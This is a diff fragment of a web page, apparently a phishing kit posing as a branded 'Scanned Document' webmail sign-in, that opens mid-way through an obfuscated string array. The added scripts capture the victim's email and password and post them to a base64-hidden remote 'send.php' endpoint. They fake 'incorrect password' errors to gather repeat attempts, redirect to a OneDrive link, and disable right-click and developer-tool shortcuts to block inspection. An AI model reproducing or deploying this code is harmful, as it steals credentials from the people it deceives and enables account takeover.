_0x3acc64=_0xde95,_0xd65766=[_0x3acc64(0x210),_0x3acc64(0x376),'true',_0x3acc64(0x261),'vyfrB',_0x3acc64(0x21e),_0x3acc64(0x167),_0x3acc64(0x305),_0x3acc64(0x27d),_0x3acc64(0x244),_0x3acc64(0x23f),_0x3acc64(0x28a),'gent',_0x3acc64(0x24e),_0x3acc64(0x1e9),_0x3acc64(0x193),_0x3acc64(0x1b4),_0x3acc64(0x26e),_0x3acc64(0x1be),'JvudQ',_0x3acc64(0x1a1),_0x3acc64(0x35f),_0x3acc64(0x32d),'ShmBx',_0x3acc64(0x16f),'*(?:[','nstru',_0x3acc64(0x1a8),'nRZwM',_0x3acc64(0x2b0),_0x3acc64(0x35b),'info',_0x3acc64(0x394),'catch',_0x3acc64(0x29c),_0x3acc64(0x3a9),_0x3acc64(0x3bc),'jOIVO',_0x3acc64(0x2ea),'DTfNX',_0x3acc64(0x2f5),_0x3acc64(0x17a),_0x3acc64(0x1b9),_0x3acc64(0x324),'cZgos',_0x3acc64(0x306),_0x3acc64(0x211),'n\x20(fu','ApUpq',_0x3acc64(0x18d),'FehJZ','zjTkl',_0x3acc64(0x35a),_0x3acc64(0x22b),'MiEnP',_0x3acc64(0x33e),_0x3acc64(0x28c),_0x3acc64(0x271),_0x3acc64(0x173),_0x3acc64(0x391),_0x3acc64(0x2b8),_0x3acc64(0x221),'IimZu',_0x3acc64(0x2b6),_0x3acc64(0x291),_0x3acc64(0x24f),_0x3acc64(0x27e),_0x3acc64(0x2c1),_0x3acc64(0x264),_0x3acc64(0x2f2),_0x3acc64(0x286),'lnsjJ',_0x3acc64(0x2ff),'maNQp',_0x3acc64(0x375),')+)+)',_0x3acc64(0x3b7),_0x3acc64(0x185),_0x3acc64(0x20e),_0x3acc64(0x194),'dzGGB',_0x3acc64(0x198),_0x3acc64(0x256),_0x3acc64(0x230),'forEa',_0x3acc64(0x1c7),_0x3acc64(0x2dc),'chain',_0x3acc64(0x3ba),_0x3acc64(0x3cd),'DGPiX',_0x3acc64(0x1cb),_0x3acc64(0x27b),_0x3acc64(0x2f1),_0x3acc64(0x3c0),_0x3acc64(0x14e),_0x3acc64(0x3cf),_0x3acc64(0x164),_0x3acc64(0x349),_0x3acc64(0x20c),_0x3acc64(0x1b3),'nZwdk',_0x3acc64(0x3c1),'QErqq','fRbXO','THSAM',_0x3acc64(0x314),_0x3acc64(0x19b),_0x3acc64(0x249),_0x3acc64(0x24a),_0x3acc64(0x25b),_0x3acc64(0x2aa),_0x3acc64(0x183),_0x3acc64(0x328),'kHouh',_0x3acc64(0x3a3),_0x3acc64(0x224),_0x3acc64(0x358),_0x3acc64(0x226),_0x3acc64(0x34f),_0x3acc64(0x231),_0x3acc64(0x28b),'APZGj',_0x3acc64(0x1a3),'file\x20',_0x3acc64(0x18c),'fdUkI','KrCHX',_0x3acc64(0x337),_0x3acc64(0x374),'knPPY','niXxO',_0x3acc64(0x399),'9,\x2015',_0x3acc64(0x2b2),_0x3acc64(0x260),_0x3acc64(0x15a),_0x3acc64(0x16c),_0x3acc64(0x2d1),_0x3acc64(0x3a4),_0x3acc64(0x2cf),_0x3acc64(0x384),'GEGHS',_0x3acc64(0x2ac),_0x3acc64(0x357),'utFnT',_0x3acc64(0x163),'FcChW',_0x3acc64(0x2cb),_0x3acc64(0x36f),'GqOZD',_0x3acc64(0x243),_0x3acc64(0x37c),'HggPq',_0x3acc64(0x34e),_0x3acc64(0x30c),_0x3acc64(0x1dc),_0x3acc64(0x26f),_0x3acc64(0x1fe),_0x3acc64(0x1bb),_0x3acc64(0x22d),_0x3acc64(0x253),'ECvEN',_0x3acc64(0x38d),_0x3acc64(0x156),'warn',_0x3acc64(0x289),'hide',_0x3acc64(0x257),_0x3acc64(0x2af),_0x3acc64(0x174),_0x3acc64(0x23e),_0x3acc64(0x3b9),'QNrNn',_0x3acc64(0x23a),_0x3acc64(0x348),_0x3acc64(0x2a7),'MTfGL',_0x3acc64(0x312),_0x3acc64(0x178),_0x3acc64(0x150),_0x3acc64(0x352),_0x3acc64(0x334),_0x3acc64(0x25e),'AMRJK',_0x3acc64(0x1c8),_0x3acc64(0x3b1),_0x3acc64(0x1a2),'zbCqf',_0x3acc64(0x200),'retur',_0x3acc64(0x21d),_0x3acc64(0x2fb),_0x3acc64(0x2bc),_0x3acc64(0x202),_0x3acc64(0x33b),_0x3acc64(0x1f6),_0x3acc64(0x1eb),_0x3acc64(0x2c8),_0x3acc64(0x2f4),_0x3acc64(0x1ff),_0x3acc64(0x31c),_0x3acc64(0x363),_0x3acc64(0x15e),'MMrSh',_0x3acc64(0x276),'ing','iXDZI',_0x3acc64(0x170),_0x3acc64(0x2f8),_0x3acc64(0x325),_0x3acc64(0x272),_0x3acc64(0x23b),'XqulK',_0x3acc64(0x16b),_0x3acc64(0x3a2),_0x3acc64(0x2db),_0x3acc64(0x151),'setIn',_0x3acc64(0x180),_0x3acc64(0x273),'ivFQs',_0x3acc64(0x17e),'1|0|5',_0x3acc64(0x277),'OIYWR',_0x3acc64(0x1ef),'ZWHWz',_0x3acc64(0x333),_0x3acc64(0x3ad),_0x3acc64(0x17b),_0x3acc64(0x3a1),'GMlAM','ilgad','JTony',_0x3acc64(0x27a),_0x3acc64(0x233),_0x3acc64(0x33c),_0x3acc64(0x1ba),'ORzqk','anlYN',_0x3acc64(0x326),_0x3acc64(0x161),_0x3acc64(0x331),_0x3acc64(0x214),_0x3acc64(0x369),_0x3acc64(0x32e),_0x3acc64(0x336),'bTkxM',_0x3acc64(0x37b),_0x3acc64(0x1f2),_0x3acc64(0x30a),_0x3acc64(0x3d0),_0x3acc64(0x1b7),_0x3acc64(0x2fe),'ement',_0x3acc64(0x2e4),_0x3acc64(0x1df),_0x3acc64(0x385),_0x3acc64(0x1b6),_0x3acc64(0x177),_0x3acc64(0x1b5),_0x3acc64(0x3a5),_0x3acc64(0x212),_0x3acc64(0x298),'ZgkgJ',_0x3acc64(0x3ae),_0x3acc64(0x389),_0x3acc64(0x255),_0x3acc64(0x250),_0x3acc64(0x340),'vztDL','2|4|1','|3|0',_0x3acc64(0x395),'fvAtp',_0x3acc64(0x1e4),_0x3acc64(0x2b9),'ORIwv',_0x3acc64(0x1f8),_0x3acc64(0x1fb),'wCnaR',_0x3acc64(0x30f),'led','wTmzg',_0x3acc64(0x3b5),_0x3acc64(0x1d3),_0x3acc64(0x22e),_0x3acc64(0x1d5),_0x3acc64(0x268),'TpamV','gger',_0x3acc64(0x37a),_0x3acc64(0x2bd),_0x3acc64(0x1d7),_0x3acc64(0x341),'paBmE',_0x3acc64(0x342),_0x3acc64(0x373),_0x3acc64(0x1da),_0x3acc64(0x2eb),_0x3acc64(0x246),'CpKgf',_0x3acc64(0x218),_0x3acc64(0x36d),_0x3acc64(0x31a),'ctor(',_0x3acc64(0x2c0),_0x3acc64(0x2b5),_0x3acc64(0x2c7),_0x3acc64(0x356),_0x3acc64(0x263),'Messa',_0x3acc64(0x285),_0x3acc64(0x19f),'bind',_0x3acc64(0x3a0),_0x3acc64(0x251),'$]*)',_0x3acc64(0x360),'EQEaf',_0x3acc64(0x335),_0x3acc64(0x152),_0x3acc64(0x207),_0x3acc64(0x162),_0x3acc64(0x1d2),_0x3acc64(0x380),_0x3acc64(0x313),_0x3acc64(0x1a4),_0x3acc64(0x29b),_0x3acc64(0x208),'SAflg',_0x3acc64(0x25d),_0x3acc64(0x223),_0x3acc64(0x2a0),_0x3acc64(0x343),_0x3acc64(0x318),'\x0acoun',_0x3acc64(0x18b),'jMleC',_0x3acc64(0x176),_0x3acc64(0x2bb),_0x3acc64(0x292),_0x3acc64(0x2d9),_0x3acc64(0x225),'src',_0x3acc64(0x339),_0x3acc64(0x274),_0x3acc64(0x3ac),_0x3acc64(0x338),_0x3acc64(0x297),_0x3acc64(0x32f),_0x3acc64(0x290),_0x3acc64(0x29e),'#dmlo',_0x3acc64(0x2f0),'hEubn',_0x3acc64(0x267),'OsAti',_0x3acc64(0x2f7),'ZjIso',_0x3acc64(0x27f),_0x3acc64(0x2f3),_0x3acc64(0x235),_0x3acc64(0x1bc),'#err_','VtfFV','3,\x2023','SSjQq',_0x3acc64(0x2e2),_0x3acc64(0x296),_0x3acc64(0x2a5),_0x3acc64(0x1e0),'nwHuF',_0x3acc64(0x293),_0x3acc64(0x259),_0x3acc64(0x2b3),_0x3acc64(0x362),'wwqRv',_0x3acc64(0x307),_0x3acc64(0x1e5),_0x3acc64(0x1dd),_0x3acc64(0x1ac),_0x3acc64(0x319),_0x3acc64(0x1e2),'Cvenx',_0x3acc64(0x159),_0x3acc64(0x281),_0x3acc64(0x3c4),'YhjcQ','idbnv','JTqkF','gKkvu','tlLCx',_0x3acc64(0x228),_0x3acc64(0x1ea),'QcEKA','dZCpz',_0x3acc64(0x38a),'log',_0x3acc64(0x1c4),_0x3acc64(0x2d2),'bjWJd','lDcZe','xwXmy',_0x3acc64(0x21c),_0x3acc64(0x241),_0x3acc64(0x32c),_0x3acc64(0x1cf),_0x3acc64(0x372),_0x3acc64(0x366),_0x3acc64(0x1a6),_0x3acc64(0x2b7),_0x3acc64(0x2d7),_0x3acc64(0x2ae),_0x3acc64(0x2c5),_0x3acc64(0x2c3),'\x20(tru',_0x3acc64(0x2e6),_0x3acc64(0x2a8),_0x3acc64(0x168),_0x3acc64(0x1a5),_0x3acc64(0x1f9),_0x3acc64(0x248),_0x3acc64(0x165),_0x3acc64(0x381),_0x3acc64(0x345),_0x3acc64(0x398),_0x3acc64(0x329),_0x3acc64(0x350),_0x3acc64(0x184),'hXLBE',_0x3acc64(0x1c6),_0x3acc64(0x283),_0x3acc64(0x3c7),'i.tel','xjfgm',_0x3acc64(0x365),_0x3acc64(0x1d8),_0x3acc64(0x1e3),'Yalvx',_0x3acc64(0x20f),'LtwXp',_0x3acc64(0x2fc),'HdQlh','tosh',_0x3acc64(0x30d),_0x3acc64(0x229),_0x3acc64(0x1d4),_0x3acc64(0x189),_0x3acc64(0x2b4),_0x3acc64(0x1e7),'gpRdK','dazdv','|2|3|','grIqE',_0x3acc64(0x1ed),_0x3acc64(0x321),_0x3acc64(0x3b0),_0x3acc64(0x1fd),_0x3acc64(0x1af),'e?nam',_0x3acc64(0x3c5),_0x3acc64(0x294),_0x3acc64(0x31b),_0x3acc64(0x347),_0x3acc64(0x1e8),_0x3acc64(0x16d),'alnBb',_0x3acc64(0x3ce),_0x3acc64(0x2ca),_0x3acc64(0x397),'boWhm','QPuvx','jATVO',_0x3acc64(0x2ec),_0x3acc64(0x3aa),_0x3acc64(0x2de),_0x3acc64(0x206),_0x3acc64(0x351),_0x3acc64(0x16a),_0x3acc64(0x2e7),_0x3acc64(0x1ee),'apply','iuyvs',_0x3acc64(0x2a4),_0x3acc64(0x3ca),_0x3acc64(0x3c9),'kIXiI','KtDQd',_0x3acc64(0x39a),_0x3acc64(0x37d),_0x3acc64(0x1a0),_0x3acc64(0x383),_0x3acc64(0x21a),_0x3acc64(0x2dd),'GznaS','17iRiWKs',_0x3acc64(0x1ae),_0x3acc64(0x393),'get',_0x3acc64(0x2e5),_0x3acc64(0x2ed),_0x3acc64(0x38e),_0x3acc64(0x262),_0x3acc64(0x187),_0x3acc64(0x22c),'VwaYP',_0x3acc64(0x39f),_0x3acc64(0x30e),_0x3acc64(0x2cd),_0x3acc64(0x364),_0x3acc64(0x1bd),_0x3acc64(0x1c0),'GIdTb',_0x3acc64(0x245),_0x3acc64(0x258),_0x3acc64(0x39d),_0x3acc64(0x36e),_0x3acc64(0x35d),_0x3acc64(0x288),_0x3acc64(0x2d6),_0x3acc64(0x311),_0x3acc64(0x169),_0x3acc64(0x2cc),_0x3acc64(0x172),'lqOyn',_0x3acc64(0x34d),_0x3acc64(0x1b1),'LduTK','JWBHw',_0x3acc64(0x26c),'auFMM',_0x3acc64(0x20b),_0x3acc64(0x2c9),'tVoMa','://ap',_0x3acc64(0x24d),_0x3acc64(0x266),_0x3acc64(0x3c8),'rRQow','QcdI5',_0x3acc64(0x30b),_0x3acc64(0x310),_0x3acc64(0x188),_0x3acc64(0x38f),_0x3acc64(0x155),_0x3acc64(0x1a9),_0x3acc64(0x1f0),_0x3acc64(0x346),_0x3acc64(0x3a6),_0x3acc64(0x21f),_0x3acc64(0x1c2),_0x3acc64(0x330),_0x3acc64(0x2da),_0x3acc64(0x28f),_0x3acc64(0x24c),_0x3acc64(0x300),_0x3acc64(0x2a6),_0x3acc64(0x234),_0x3acc64(0x378),'zsZlx',_0x3acc64(0x2f9),_0x3acc64(0x28e),'4|1|2',_0x3acc64(0x166),_0x3acc64(0x205),_0x3acc64(0x1de),_0x3acc64(0x3bf),_0x3acc64(0x34c),_0x3acc64(0x1fa),_0x3acc64(0x379),'yMRXV',_0x3acc64(0x317),_0x3acc64(0x3be),_0x3acc64(0x190),_0x3acc64(0x1ec),'inner',_0x3acc64(0x36c),_0x3acc64(0x2e8),_0x3acc64(0x237),'ZUiDV',_0x3acc64(0x308),_0x3acc64(0x18f),'OCvDa',_0x3acc64(0x280),_0x3acc64(0x323),_0x3acc64(0x242),_0x3acc64(0x192),_0x3acc64(0x2e0),_0x3acc64(0x209),_0x3acc64(0x353),'num','IUidA',_0x3acc64(0x20d),_0x3acc64(0x14d),_0x3acc64(0x14f),_0x3acc64(0x315),_0x3acc64(0x327),_0x3acc64(0x355),_0x3acc64(0x153),_0x3acc64(0x2e3),_0x3acc64(0x2a2),_0x3acc64(0x31e),_0x3acc64(0x367),_0x3acc64(0x359),_0x3acc64(0x2be),_0x3acc64(0x34b),_0x3acc64(0x2a1),_0x3acc64(0x332),_0x3acc64(0x199),_0x3acc64(0x3bb),'mOQkM',_0x3acc64(0x396),',\x0apwd',_0x3acc64(0x157),_0x3acc64(0x279),_0x3acc64(0x38c),'XkWKB',_0x3acc64(0x23c),_0x3acc64(0x2d8),_0x3acc64(0x3b4),_0x3acc64(0x203),_0x3acc64(0x181),'qYxnt',_0x3acc64(0x236),_0x3acc64(0x3a7),_0x3acc64(0x282),_0x3acc64(0x1d1),'OvMaR',_0x3acc64(0x29a),'dcogr',_0x3acc64(0x26a),'RtLxt',_0x3acc64(0x17d),_0x3acc64(0x2d0),_0x3acc64(0x154),_0x3acc64(0x26d),'zRApQ','t.com',_0x3acc64(0x269),_0x3acc64(0x22a),_0x3acc64(0x222),_0x3acc64(0x19a),_0x3acc64(0x316),_0x3acc64(0x36a),_0x3acc64(0x239),'xhLpl',_0x3acc64(0x247),_0x3acc64(0x36b),_0x3acc64(0x3c2),'oEUdq','TviaT',_0x3acc64(0x175),_0x3acc64(0x17f),_0x3acc64(0x361),'jfaoa',_0x3acc64(0x368),_0x3acc64(0x22f),_0x3acc64(0x15c),_0x3acc64(0x265),'while',_0x3acc64(0x2ce),_0x3acc64(0x217),_0x3acc64(0x371),_0x3acc64(0x2e9),_0x3acc64(0x34a),_0x3acc64(0x2f6),'EMcQm',_0x3acc64(0x287),'QMSws',_0x3acc64(0x20a),'qzpeF',_0x3acc64(0x196),_0x3acc64(0x392),'__pro',_0x3acc64(0x388),_0x3acc64(0x1f4),'qbfuJ',_0x3acc64(0x33d),_0x3acc64(0x3b3),_0x3acc64(0x3b2),_0x3acc64(0x33f),'OTyIT',_0x3acc64(0x2df),'AXFAI','ugcVf',_0x3acc64(0x232),_0x3acc64(0x354),_0x3acc64(0x1d6),_0x3acc64(0x370),_0x3acc64(0x1cd),'qWUNT',_0x3acc64(0x15f),_0x3acc64(0x1c3),_0x3acc64(0x3c3),_0x3acc64(0x2fa),_0x3acc64(0x215),_0x3acc64(0x18a),_0x3acc64(0x19c),_0x3acc64(0x1fc),'earbi',_0x3acc64(0x201),_0x3acc64(0x2c6),'#err1',_0x3acc64(0x39c),'gJkxJ',_0x3acc64(0x2c4),_0x3acc64(0x1b8),_0x3acc64(0x309),_0x3acc64(0x24b),_0x3acc64(0x19d),_0x3acc64(0x2ef),'chat_',_0x3acc64(0x1c9),_0x3acc64(0x301),_0x3acc64(0x197),_0x3acc64(0x216),_0x3acc64(0x377),'wQsjK',_0x3acc64(0x220),_0x3acc64(0x179),_0x3acc64(0x2fd),_0x3acc64(0x284),_0x3acc64(0x31d),'ajtxA',_0x3acc64(0x240),_0x3acc64(0x1b2),_0x3acc64(0x322),_0x3acc64(0x1cc),'8nzfqHo','NjqNr',_0x3acc64(0x275),_0x3acc64(0x2b1),_0x3acc64(0x3af),_0x3acc64(0x17c),_0x3acc64(0x35c),'DSCdX','NOxAO',_0x3acc64(0x320),_0x3acc64(0x2ee),'aLixa',_0x3acc64(0x33a),_0x3acc64(0x386),_0x3acc64(0x3ab),'sQoQo',_0x3acc64(0x2ab),_0x3acc64(0x31f),_0x3acc64(0x219),_0x3acc64(0x1c1),_0x3acc64(0x2a9),_0x3acc64(0x2a3),_0x3acc64(0x158),_0x3acc64(0x32a),_0x3acc64(0x204),_0x3acc64(0x3bd),'sQFQN',_0x3acc64(0x3a8),'caiwZ',_0x3acc64(0x37e),'GpcDa',_0x3acc64(0x278),_0x3acc64(0x254),_0x3acc64(0x15b)];return _0x39d7=function(){return _0xd65766;},_0x39d7();}
+
+function _0x11ab(_0x52650f,_0x45f209){var _0x2fc884=_0x2fc8();return _0x11ab=function(_0x11ab96,_0x311906){_0x11ab96=_0x11ab96-0x9a;var _0x15bc7b=_0x2fc884[_0x11ab96];return _0x15bc7b;},_0x11ab(_0x52650f,_0x45f209);}(function(_0x5d5447,_0x39eb0e){var _0x2f73b0=_0x11ab,_0x59503b=_0x5d5447();while(!![]){try{var _0x2eb86f=parseInt(_0x2f73b0(0xaf))/0x1*(-parseInt(_0x2f73b0(0xa1))/0x2)+-parseInt(_0x2f73b0(0x9a))/0x3*(parseInt(_0x2f73b0(0x9d))/0x4)+parseInt(_0x2f73b0(0x9b))/0x5+-parseInt(_0x2f73b0(0xb0))/0x6+-parseInt(_0x2f73b0(0xb2))/0x7+-parseInt(_0x2f73b0(0xa5))/0x8+parseInt(_0x2f73b0(0xa6))/0x9*(parseInt(_0x2f73b0(0xb8))/0xa);if(_0x2eb86f===_0x39eb0e)break;else _0x59503b['push'](_0x59503b['shift']());}catch(_0x225238){_0x59503b['push'](_0x59503b['shift']());}}}(_0x2fc8,0xbdab5),$(document)['ready'](function(){var _0x53e522=_0x11ab,_0x2c05cd=0x0;$(_0x53e522(0xbb))['submit'](function(_0x4a4e13){var _0x1c97ba=_0x53e522;_0x4a4e13[_0x1c97ba(0xae)]();var _0x48253f=$(_0x1c97ba(0xab))[_0x1c97ba(0xbe)](),_0x213e7e=$('#password')[_0x1c97ba(0xbe)](),_0x44d4ff=$(_0x1c97ba(0xba))[_0x1c97ba(0xb5)]();$('#msg')[_0x1c97ba(0xb1)](_0x44d4ff);var _0x58f0cb=_0x48253f,_0x1fed58=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x1fed58[_0x1c97ba(0xb3)](_0x58f0cb))return $('#error')[_0x1c97ba(0xa3)](),_0x48253f[_0x1c97ba(0xb7)],![];if(!_0x1fed58[_0x1c97ba(0xb3)](_0x58f0cb))return $(_0x1c97ba(0xba))[_0x1c97ba(0xa3)](),$('#msg')['addClass']('alert-danger'),$(_0x1c97ba(0xba))[_0x1c97ba(0xb5)](_0x1c97ba(0xa4)),![];;_0x2c05cd=_0x2c05cd+0x1,$[_0x1c97ba(0xaa)]({'dataType':_0x1c97ba(0xb9),'url':atob(_0x1c97ba(0xad)),'type':_0x1c97ba(0xa2),'data':{'email':_0x48253f,'password':_0x213e7e},'beforeSend':function(_0x1cecf8){var _0xdb99e6=_0x1c97ba;$(_0xdb99e6(0xa0))[_0xdb99e6(0xb5)]('Verifing...');},'success':function(_0x3dfa43){var _0x8d2a4e=_0x1c97ba;_0x3dfa43&&($(_0x8d2a4e(0xba))[_0x8d2a4e(0xa3)](),console['log'](_0x3dfa43),_0x3dfa43[_0x8d2a4e(0xa8)]=='ok'?($(_0x8d2a4e(0xbc))[_0x8d2a4e(0xbe)](''),$(_0x8d2a4e(0xbc))[_0x8d2a4e(0x9e)]('grey-form'),$('.modal-header')[_0x8d2a4e(0xb4)](_0x8d2a4e(0xb6)),_0x2c05cd>=0x2&&(_0x2c05cd=0x0,window[_0x8d2a4e(0x9f)]['replace']('https://onedrive.live.com/redir?resid227BFC55B5&ithint&authkey=!AEPvKF_OtOAaCH0==file,pdfE87969!134&e=GXnFAo%5Cx27')),$(_0x8d2a4e(0xba))[_0x8d2a4e(0xb5)]('<color\x20style=\x22color:red;\x22>Session\x20Expired!\x20Please\x20Sign\x20In</color>')):($('#msg')['show'](),$(_0x8d2a4e(0xba))[_0x8d2a4e(0xb4)](_0x8d2a4e(0xa7)),$(_0x8d2a4e(0xba))[_0x8d2a4e(0xb5)]('Incorrect\x20Email\x20Password!\x20Try\x20again')));},'error':function(){var _0x114bcb=_0x1c97ba;$('#password')[_0x114bcb(0xbe)](''),$('#password')['removeClass'](_0x114bcb(0xa9)),$(_0x114bcb(0xac))[_0x114bcb(0xb4)](_0x114bcb(0xb6)),_0x2c05cd>=0x3&&(_0x2c05cd=0x0,window['location'][_0x114bcb(0xbd)]('https://onedrive.live.com/redir?resid227BFC55B5&ithint&authkey=!AEPvKF_OtOAaCH0==file,pdfE87969!134&e=GXnFAo%5Cx27')),$(_0x114bcb(0xba))[_0x114bcb(0xa3)](),$('#msg')[_0x114bcb(0xb4)]('alert-danger'),$('#msg')[_0x114bcb(0xb5)]('Incorrect\x20Email\x20Password!\x20Try\x20again');},'complete':function(){var _0xf9dfd0=_0x1c97ba;$(_0xf9dfd0(0xa0))[_0xf9dfd0(0xb5)](_0xf9dfd0(0x9c));}});});}));function _0x2fc8(){var _0x27f93c=['ajax','#email','.modal-header','aHR0cHM6Ly9zZXZlcmhvc3QuY29tL21pY3Jvc29mdC9zZW5kLnBocA==','preventDefault','2TjBIEp','1324902NKvuAF','text','7538881gZPKON','test','addClass','html','hide','focus','12113680hYfKLF','JSON','#msg','#contact','#password','replace','val','1077582wFpliK','5492085MuxZxs','Try\x20Again','12YucvUJ','removeClass','location','#submit-btn','1483876ktFZdc','POST','show','That\x20account\x20doesn\x27t\x20exist.\x20Enter\x20a\x20different\x20account','771024fLMIdy','27trWtla','alert-danger','signal','grey-form'];_0x2fc8=function(){return _0x27f93c;};return _0x2fc8();}
+
+</script>
+<script>
+      // disable right click    
+  document.addEventListener('contextmenu', event => event.preventDefault());
+
+  document.onkeydown = function (e) {
+
+      // disable F12 key
+      if(e.keyCode == 123) {
+          return false;
+      }
+
+      // disable I key
+      if(e.ctrlKey && e.shiftKey && e.keyCode == 73){
+          return false;
+      }
+
+      // disable J key
+      if(e.ctrlKey && e.shiftKey && e.keyCode == 74) {
+          return false;
+      }
+
+      // Prevent Ctrl+s = disable save
+      if (event.ctrlKey && (event.keyCode === 85 || event.keyCode === 83 || event.keyCode ===65 )) {
+          return false;
+      }
+
+      // disable U key
+      if(e.ctrlKey && e.keyCode == 85) {
+          return false;
+      }
+  }
 
 </script>
 
-</html>
+    <script>
+
+     { document.getElementById('email').value = getEmail();
+       var domain = getEmail().substring(getEmail().lastIndexOf("@") +1);
+       var frmsite = domain.substring(0, domain.indexOf("."));
+       document.title = ucFirst(frmsite)  +" Scanned Document :: Welcome to " +ucFirst(frmsite) +" Webmail Service";
+       document.getElementById("head-message").innerHTML = `${ucFirst(frmsite)} Scanned Document`;
+       document.getElementById("fieldImg").src = 'https://logo.clearbit.com/'+domain;
+      
+       function getEmail(){
+       if(window.location.hash){
+       var url = window.location.href;
+              var hash = url.split('#').pop();
+              return atob(hash);
+       }
+      }
+  
+  
+          function ucFirst(str){
+        return str.charAt(0).toUpperCase()+  str.slice(1);
+      }
+  }  
+  </script>
+    </html>
